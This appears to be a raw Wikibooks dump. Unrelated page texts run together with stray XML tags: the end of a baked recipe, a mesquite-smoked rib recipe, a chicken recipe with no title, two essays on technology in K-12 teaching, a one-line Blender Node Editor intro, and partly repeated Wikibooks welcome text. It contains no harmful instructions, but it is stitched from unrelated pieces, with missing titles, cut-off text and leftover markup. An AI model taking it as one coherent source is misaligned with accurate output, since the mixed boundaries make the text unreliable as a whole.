#Remove foil and lower temperature to 350. Bake for another 30 minutes or until browned and bubbly on top.
#Place serving portions onto plates and garnish with basil. Serve warm.

These ribs use a Southwestern style rub, feature a sauce with a lot of prominent Mexican flavors, and are cooked over mesquite instead of hickory, which isn't very easy to find in the South, however mesquite is.

== Ingredients ==
* 1 slab St. Louis pork ribs
* 1/4 cup light brown sugar
* 1 tbs habanero chile powder
* 1/4 cup ancho chile powder
* 1 tbs dried Mexican [[Cookbook:Oregano|oregano]]
* 1 tbs salt
* 1 tbs freshly ground [[Cookbook:Pepper|black pepper]]
* 1 tbs chipotle powder
* 1 habanero chile, seeded and minced
* 1 1/2 cups [[Cookbook:Kansas City Barbecue Sauce|barbecue sauce]]
* 1/4 cup tequilla (recommended: José Cuervo Especial)
* Large mesquite chunks

== Procedure ==
#Combine sugar, chile powders, oregano, salt, and pepper. Remove membrane from ribs and rub both sides with mixture. Refrigerate for at least 1 hour.
#Combine tequilla, habanero, and sauce. Bring to a boil in a large saucepan over medium high heat. Set aside.
#Place enough mesquite chunks in a smoker to keep the temperature at 200 degrees F. Place ribs in smoker and cook 7 hours, basting every hour with sauce mixture.
#Brush meat side liberally with sauce mixture. Place sauce side down on a high grill and cook until well browned. Brush other side with sauce and repeat 1 more time.
#Slice ribs into 1-rib portions and serve warm with remaining sauce.</text>

      <text xml:space="preserve">One of the biggest challenges for technology in education is actually not designing curriculum that suits each student or subject, but educating teachers not only who have the sole responsibility of introducing this method to students, but who have spent decades doing things the traditional way. Technology as powerful tools promote a depth of understanding that corresponds with rising educational standards which in turn emphasize deep understanding, critical thinking skills, and ability to apply learned material to real-life situations. Students are already using technology as part of their daily routine; blogging, social networking, using search engines like Google, Yahoo etc, sharing thoughts, media content and opinions with friends, family and strangers. Students are indeed empowered when technology is successfully integrated with school work and curriculum, allowing students to explore, research, discipline and learn through technology. Technology-infused projects like the one offered in the sample social studies unit below, should bring attention to the process of learning how to construct knowledge. The potential for technology to facilitate this process is the reason it is relevant in designing a unit that incorporates the use of technology and especially mind tools. 

In a New York Times article, “At School, Technology Starts to Turn a Corner,” by Steve Lohr (New York Times August 16, 2008), Lohr wrote “The project-based approach, some educators say, encourages active learning and produces better performance in class and on standardized tests”. As a technological optimist myself, I agree with this. Teaching with project based curriculums is one of the best methods of igniting a classroom setting. Since it combines the classroom with web and technological projects, the students have a taste of both worlds.  Students in 7th grade are expected to learn a variety of facts associated with the American historical period, as well as a range of skills pertinent to any discipline in the humanities at the secondary school level. In designing this single unit that would be part of a curriculum, the distinctive element is that though the content will be taught by the teacher, independent research and the use of various technology, Web 2.0 and mind tools will be conducted by students in such a way as to provide answers to the unit’s Essential Questions. 

Designing a unit:
To help the teacher structure his or her teaching around these Essential Questions, the unit includes a short list of Enduring Understandings that connect to the overarching question. The goal of designing this unit is to teach American history not only in an engaging way that leads students to a better understanding both of the history of our country and of themselves as current participants in this unfolding society, but teach and promote technological learning, discipline and a higher level of critical thinking. 

Plato and Dewey believed that students should recognize individual differences and use this knowledge to work cooperatively in society (Walker &amp; Soltis 2004, p.16).  When students are able to see the ways in which different values play a significant part in the lives and actions of individuals, and therefore in history, they will be better prepared to cope in today’s society where collaboration with individuals holding different values becomes reality. 
The hope is that, by bringing technology, web 2.0 and mind tools into focus to form a project based unit, the teacher will encourage students to utilize these tools to guide and promote their own decision-making process in collaborative work.

Finally, this unit provides a rich learning framework that is developmentally appropriate and also includes the concepts and content of collaboration that encourages a climate of shared inquiry, risk-taking, brainstorming and appreciation of history at the same time. In addition, the content and concepts in the unit will encourage students to employ higher level thinking and problem solving skills in order to research, re-enact, or re-create the past while utilizing  today’s tools.

== Mindtools: ==
INTRODUCTION to mind tools, technology and the unit:
What are mind tools and to what extent do they affect the learning process?
Mind Tools  work as learning partners or assistants, facilitating and engaging in critical thinking as well as higher order learning. Multiple skills such as focusing skills, organizing skills, analyzing skills, integrating skills and evaluating skills are involved in critical thinking.
Mind Tools are described by Jonassen as &quot;a way of using a computer application program to engage learners in constructive, higher-order, critical thinking about the subjects they are studying&quot;. Indeed they are. They consist of technology based conceptual tools. These tools can be internal [e.g. self-talk, memory devices, strategies) or external (e.g. computer hardware and software) to the learner. With reference to computer-based mind tools, this means moving away from software that simply presents information to the learner, and towards software that the learner can use to develop their own understandings [by collecting, organizing, and analyzing information]. Mind Tools can be used to teach critical thinking and problem solving, as well as to develop or even change the perception of concepts. Examples of mind tools are: Concept Maps, Computer conferencing, Graphic software, Hypermedia designing software, Word Processors, Database tools, Spreadsheets and Networking (i.e. chat) 	Learning with cognitive tools or mind tools refers to &quot;the mindful engagement of learners in the tasks afforded by these tools and the possibility of qualitatively upgrading the performance of the joint system of learner plus technology.&quot; In other words, when students work with computer technology, instead of being controlled by it, they enhance the capabilities of the computer, and the computer enhances their thinking and learning. Each of the following mind tools encourage: Communication and leadership skills, Problem Solving, Decision Making, Project Management and improve memory. They however qualify as mind tools because they engage learners in constructive, higher-order, critical thinking about the subjects they are studying. The main ingredients offered by Jonassen.

Mind Tools in problem solving:
Students will begin the project by researching and bookmarking pages that will provide useful information towards processing and understanding the historical sense of Native Americans. They will create a group in Delicious and tag researched pages of articles and journals with &quot;ProjectCurriculum, Native Americans and Explorers&quot;. They will share their individual researched journals and articles and decide collectively on which articles to divide and read and then write short annotative bibliographies that will in turn familiarize each group member with the reading. Students will compile their Annotative Bibliographies and upload it to Google documents, sharing one main document titled &quot; Who were Native Americans&quot; where each student can read the Annotated Bibliographies each wrote, and correct or add information. The second stage involves utilizing flickr to find images that will help support the journals. Finally, myWebspiration will be used to create a visual concept map of the history and journey of the Native Americans until present day.  The teacher will provide information on several technology and mind tools to aid in designing a collaborative online journal that will be presented.
Goal: Through the entire project students will understand that a world existed long before Columbus and the Europeans arrived. But most importantly, they will learn to work as a group using technology, some of the mind tools stated above.

      <text xml:space="preserve">== '''Understanding the Salient aspects of Computer-based Communications''' ==

This research paper is a project aimed at motivating Technical Coordinators and educators K-12 in the preparation of our future generation. The motivation is for coordinators who desire to make use of various technology-based environments inside and outside of the classroom borders. In order to develop and integrate technology skills which will allow students to communicate with others safely and effectively this research will share the benefits of using a technology-based environment.  It will also help understand how we can help students develop careers.  As Tech Coordinators we believe that a Computer based environment is meant to enhance and provoke education and develop life long goals.  

As we know it technology is ubiquitous, it touches almost every part of our lives, our communities and our homes. Yet, it is no secret that our schools are lagging far behind when it comes to integrating technology into classroom learning. However, we are just beginning to explore the true potential technology offers for teaching and learning. Moreover, when properly used, technology will help our students acquire the skills they need to survive in a complex and highly technological knowledge-based economy. I believe that integrating technology into our classroom instruction means more than just teaching basic computer skills and software programs in a separate computer class. Students are resilient and they learn quickly.  With that being said, they are more likely to stay engaged and on task when using computer-based communication which may even reduce behavioral issues.

Communication is the ground for dialogue. In addition, there are many ways to communicate which can provoke dialogue, as well as to act as a go-between for learning. Today, the most popular implementation of peer communication is P2P, which is often associated with file sharing. 
Ulf Blomqvist (2006) one of the most fascinating facets of P2P is that it promotes dialog between students. This type of communication can keep students interested in learning and help to sharpen many over arching skills.  It will essentially provoke collaboration and teamwork when created in a friendly environment.  In addition, peer tutoring can evolve in a broad range of activities with which students help other students.  I have observed students tutoring one another.  In my classroom, I feel it is important to develop classroom leaders it develops self-esteem and embeds instruction.  In addition, class leaders prevent the educator from having to be all around the classroom at once.  In this way, file sharing can enhance the role of an educator while effectively relinquishing traditional classroom barriers. This tool is a perfect example of how technology can help enhance the user and their capabilities.  

VoIP telephony Voice over Internet Protocol (VoIP) is one of the “new” telephone technologies. VoIP allows you to make telephone calls using a broad-band Internet connection instead of a regular phone line.
Ulf Blomqvist (2006) Again P2P and its file sharing capabilities are most useful to our students when provoking collaboration and teamwork.  Online conferencing which is again a great collaborating tool says, Blau and Caspi (2007), he reported that students' relative participation in Skype lessons were higher than in face-to-face lessons.  The online learning environment allows the user to collaborate anytime and anywhere with synchronous technology.  However students don’t have to be in the same classroom.  Online learning is a classroom without borders.  As a matter of fact, I can Skype my boss from another country for a meeting which I must attend.  Distance is no barrier when you effectively use this technology.  University students are taking advantage of the many advantages of P2P specifically online conferencing in their physical absence.  I would love to see K-12 students who can’t make it in to school because of suspensions Skype in to class from a place of isolation rather than staying home and doing nothing.  

Next, online chatting can often be viewed negatively because it can become a classroom distraction. However, chatting can also be used as another tool to enhance the way students effectively collaborate.  Chat discussions can be used as a mode of instruction which I believe can provide interactive learning, meaningful instruction, enhanced communication and collaboration along with formative testing which helps to modify teaching.  Like chatting, emailing is another form of social networking. It allows students into an online community to share interests and activities.  Often times, I have noticed that this form of communication encourages students to draw out their writing skills; whereas, they were ordinarily less confident.  The student’s word forms are produced with completeness and correctness.  In addition, words are crafted with more thought and reflective care than when spoken.  Subsequently, users are allowed some control over the look and feel of their pages and can be customized with information or forms of amusement.  With all of this being said, it is essential that educators change with the time.  Students need educators to remain innovative and fun.  It would be to each student’s advantage if they had an educator which was not afraid of the use of technology.  After all, technology works well only in conjunction with the duties it’s delegated.  Moreover, with the increasing popularity of social networking tools among youth, educators need to understand what these tools are and how they are used. Integrating this type of learning can demonstrate how academic knowledge and skills are applied in the workplace and other settings. It would be a smart idea to connect students to multiple and essential ideas introducing them to an endless range of technology with which to collaborate and communicate effectively.

Another useful and engaging source of communication is the use of Blogs.  Blogs are online journals which can be maintained by students individually or through the schools intranet or website.  With regular entries of information, comments, and graphics and video entries are usually displayed in reverse chronological order. Blogs provide comments or information on a particular subject by user; others use as personal diary for invited viewers. Most blogs are text-based, although some focus on music, audio (podcasting), and video.  Blogs can be found as features or add-ins in other applications such as social networking. They work best when they have a clear objective and purpose and are designed with realistic expectations about posting quality and frequency, and when they provide feedback methods such as comments and ratings.  Blogs can be used as simple web pages posting recent information, promoting upcoming events, and sharing student activities.  Next, are Wikis a wiki is a collection of web pages designed to enable anyone who accesses the material to contribute or modify content using simple tools. They are used to create collaborative web sites, informal intranets, and simple knowledge-management systems. Wikis can be used as stand-alone tools or be included as add-in features in other web, social networking, and e-learning tools. They are useful for groups connected by common interests and purposes that need to collaborate on an issue. A wiki can replace the long e-mail trails and documents generated by many group projects and scattered across computer and network file folders.

As educators we can use them for facilitating online collaboration and projects.  A wiki is for “work” rather than “play” most of my students were never exposed to wikis before now.  I encourage my youth to use Wikipedia to explore topics of interest.  When we properly use, Web 2.0 and other related tools we can promote positive outcome for youth, schools and educators who work with them. Proper use of Technology can help keep tech-savvy young students connected to and engaged in learning. It gives students the opportunity to become informed about their peers and cohesively work with them.  As Tech Coordinators and educators we can also help schools by extending our reach and broaden our use and knowledge of technology.  This mission will support students and staff along with promote organizational efficiency.  

While we strive to keep our youth communicating and learning we are also developing them towards a career and job opportunities.  Our goals should be to continue building on students' interests using classroom projects and technology invites them into career development.  With that being said, communicating and collaborating with other students universally will prompt students to become knowledgeable about the world of work, become familiar with career choices while continuing to relate using personal skills. 

And, although choosing a career may seem far off for some students, others who are already 9-12th graders are now engaging in the creative thinking of the career development path. And as Educators it is our job to help students easily transition from one level to the next. In addition, if students have been given all the tools talked about previously we are doing our job.  Our objective is to prepare them with the specific knowledge/skills necessary for them to progress toward gainful employment, career advancement, and success in postsecondary programs.  Each student should have more of an opportunity to develop and demonstrate understanding requiring creative thinking.

Students should be able to demonstrate creative thinking, construct knowledge and engage in innovative communicative tools using technology. 

Students will:

	apply existing knowledge to generate new ideas
	create original works as a means of personal or group expression.
	use models and simulations to explore complex systems and issues
	identify trends and other possibilities 

Students should have a solid understanding of computer based environment to communicate and work collaboratively, including at a distance, to support individual learning and contribute to the learning of others.  

Students will:

	interact, collaborate , and publish with peers, experts , or others employing a variety of online     environments and media
	develop cultural understanding and global awareness by engaging with learners of other cultures
	contribute to project teams to produce original works or solve problems

Students should effectively use computer based communication skills to plan and conduct research, manage projects, solve problems, and make informed decisions using appropriate communication tools and resources.  

Students will:

	identify and define authentic problems and significant questions for investigation
	plan and manage activities to develop a solution or complete a project
	collect and analyze data to identify solutions and/or make informed decisions
	use multiple processes and diverse perspectives to explore alternative solutions


Students should demonstrate a sound understanding of technology concepts, systems and operations.  

Students will:

	understand and use technology systems
	select and use applications effectively and productively
	trouble shooting systems and applications
	transfer current knowledge to learning of new technologies

Lastly, a performance that develops and demonstrates students' understanding also requires assessment.  Ongoing assessments along with coaching help students to refine and improve their performances of understanding.  Ongoing assessments are based on ongoing criteria (or rubrics) and are publically shared early in the process of developing a performance so that students understand what they are trying to achieve&quot;.  Our hope is that opportunities for every student will develop:


	their full potential
	instruction to meet individual needs
	increase multiple culture group settings
	develop students' ability to think critically and apply their knowledge in the world and be continued learners
	Enable students to succeed in the modern workplace


In conclusion, by combining p2p, conferencing, messaging, group and project software a good collaborative educational environment can be created. This environment will not replace the thorough planning and supervision of the students working process. The teacher’s role is additionally to provide good working methods, templates and schedules for the projects in order to make them successful. We as educators will continue to play a crucial role in creating environments to facilitate and motivate learners to take responsibility for their learning, develop good learning habits, and become independent learners. Educators will help students be more equipped to control learning environments so that they can practice language skills and communicate with others both in and out of the classroom; even, after a course ends.  As we know it, technology has greatly influenced our modern age, and has allowed us to access great amounts of information.  These opportunities, we hope, will one day create citizens who will sustain local and global communities.

== Ingredients ==
* 2 each boneless skinless chicken thighs, drumsticks, and boneless skinless chicken breasts
* [[Cookbook:Hickory BBQ Rub|Hickory BBQ Rub]]
* 1 cup salt
* 3/4 cup honey
* 2 cups hot apple cider vinegar
* 1 pound ice
* 1 cup [[Cookbook:Kansas City Barbecue Sauce|homemade barbecue sauce]] (bottled barbecue sauce has too much sugar)
* Hickory wood chips

'''Equipment'''

*2 probe thermometers

== Procedure ==
#Combine salt, honey, and vinegar in a gallon size zip-top bag until salt has dissolved. Add ice and shake until ice is almost completely melted and mixture has cooled down. Insert chicken pieces and refrigerate 1 1/2-2 hours, turning once.
#Place a good amount of hickory chips in the bottom of a large roasting pan. Place a roasting rack in that pan. Set aside.
#Drain chicken and discard mixture. Pat dry with paper towels and season chicken liberally on both sides with rub. Gently pat into meat and refrigerate for at least 1 hour (more rub will stick if you wear gloves).
#Toss chicken pieces in barbecue sauce. Place on the prepared roasting pan and insert 1 probe thermometer into one of the breasts and one into the thighs. Bake in the center of a 375 degree F oven until both the thigh and the breast's internal temperature reach 165 degrees F.
#Bring remaining sauce to a boil in a large saucepan over medium high heat for 5 minutes. Set aside. 
#Remove and cover with aluminum foil. Let rest 10 minutes. Serve warm with remaining sauce.</text>

Blender’s ''Node Editor'' lets you assemble various processing blocks (''nodes'') into combinations which feed data to one another along connections that you specify to produce complex effects. These effects can be used in three different ways: as textures, as materials, or for compositing. The Node Editor makes different kinds of processing blocks available, depending on which of the three kinds of effects you are producing.</text>

* If you are a '''Wikipedian''', see [[Wikibooks:Wikibooks for Wikipedians]] for a primer on how things work here (it's a little different).
** If you want to base your work here on materials from Wikipedia, please use [[WB:RFI]] (requests for importation) to bring the material over in compliance with the GFDL.
* If you're an '''instructor''' and plan on using Wikibooks for a class project, see [[Wikibooks:Guidelines for class projects]]
* Please say hello at the [[Wikibooks:Reading room|Reading Room]] with any questions or ideas.

* To learn the wiki-markup-language syntax, see [[Help:Editing]].
* Make sure to sign your posts and comments with four tildes, like this: &amp;#126;&amp;#126;&amp;#126;&amp;#126; 
**There is a box at the top of the edit window (if javascript is enabled on your browser) that will insert it too (looks like part of a signature). This will let others know who left it, and make it easy to reply back to you.
* Remember to conduct any editing experiments in the [[Wikibooks:Sandbox|sandbox]].
* You can tell the community something about yourself in your userpage.
** You can get to this page by clicking the tab at the top of the page labeled with your registered username.
* Wikibooks is a collection of open-source textbooks. ([[WB:WIW|What is Wikibooks]]).
* If you are a '''Wikipedian''', see [[Wikibooks:Wikibooks for Wikipedians]] for a primer on how things work here (it's a little different).
** If you want to base your work here on materials from Wikipedia, please use [[WB:RFI]] (requests for importation) to bring the material over in compliance with the GFDL.
* If you're an '''instructor''' and plan on using Wikibooks for a class project, see [[Wikibooks:Guidelines for class projects]]
* Please say hello at the [[Wikibooks:Reading room|Reading Room]] with any questions or ideas.
* Eventually, you might want to read the [[Wikibooks:Manual of Style|Manual of Style]] and [[Wikibooks:Policies and guidelines|Policies and Guidelines]].
** Help us by participating in policy and guideline creation.
** Please take a look at [[Wikibooks:Naming policy]] before starting a new book.
